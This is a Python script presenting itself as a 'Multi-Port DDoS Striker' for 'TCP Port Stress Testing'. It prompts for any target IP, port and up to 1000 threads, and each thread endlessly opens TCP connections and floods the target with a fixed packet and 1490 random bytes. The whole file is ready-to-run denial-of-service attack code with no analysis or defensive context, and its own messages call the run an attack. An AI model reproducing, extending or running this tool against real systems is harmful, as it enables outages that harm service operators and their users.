import socket
import random
import time
import os
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_packet():
    # Generate a packet with random data
    packet = bytearray([
        0x00, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x35,
        0x2e, 0x35, 0x2d, 0x31, 0x30, 0x2e, 0x31, 0x2e,
        0x32, 0x33, 0x2d, 0x53, 0x65, 0x72, 0x76, 0x65,
        0x72, 0x00
    ])
    return bytes(packet)

def attack(ip, port, thread_id):
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Set timeout to 1 second
        
        while True:
            try:
                # Try to establish connection
                sock.connect((ip, port))
                
                # Send initial packet
                packet = generate_packet()
                sock.send(packet)
                
                # Send random data
                random_data = random._urandom(1490)
                sock.send(random_data)
                
                print(f"Thread {thread_id}: Sent packet to {ip}:{port}")
                
                # Close and create new socket
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
            except socket.error:
                # If connection fails, create new socket and continue
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                continue
                
    except Exception as e:
        print(f"Thread {thread_id} error: {str(e)}")

def main():
    clear_screen()
    print("\033[95m╭───────────────────────────────────────╮\033[0m")
    print("\033[95m│\033[0m      \033[92mMulti-Port DDoS Striker\033[0m       \033[95m│\033[0m")
    print("\033[95m╰───────────────────────────────────────╯\033[0m")
    print("\033[93m➤ Version\033[0m   : 1.0")
    print("\033[93m➤ Purpose\033[0m   : TCP Port Stress Testing")
    print("\033[93m➤ Features\033[0m  : Any Port & Multi-Threading Support")
    print()

    # Get target information
    print("\033[94m[+]\033[0m Target Configuration:")
    print("   " + "─" * 30)
    ip = input("\033[94m[\033[0m?\033[94m]\033[0m Target IP Address : ")
    port = int(input("\033[94m[\033[0m?\033[94m]\033[0m Target Port      : "))
    threads = int(input("\033[94m[\033[0m?\033[94m]\033[0m Thread Count (1-1000) : ") or "100")
    
    threads = min(max(threads, 1), 1000)  # Limit threads between 1 and 1000

    clear_screen()
    print("\033[91m╭───────────────────────────────────────╮\033[0m")
    print("\033[91m│\033[0m        \033[93mAttack In Progress\033[0m          \033[91m│\033[0m")
    print("\033[91m╰───────────────────────────────────────╯\033[0m")
    print(f"\n\033[92m➤ Target IP\033[0m   : {ip}")
    print(f"\033[92m➤ Target Port\033[0m : {port}")
    print(f"\033[92m➤ Threads\033[0m     : {threads}")
    print("\n\033[91m[!]\033[0m Press Ctrl+C to terminate the attack\n")

    # Create thread pool
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for i in range(threads):
            executor.submit(attack, ip, port, i+1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!]\033[0m Attack terminated by user")
        os._exit(0)
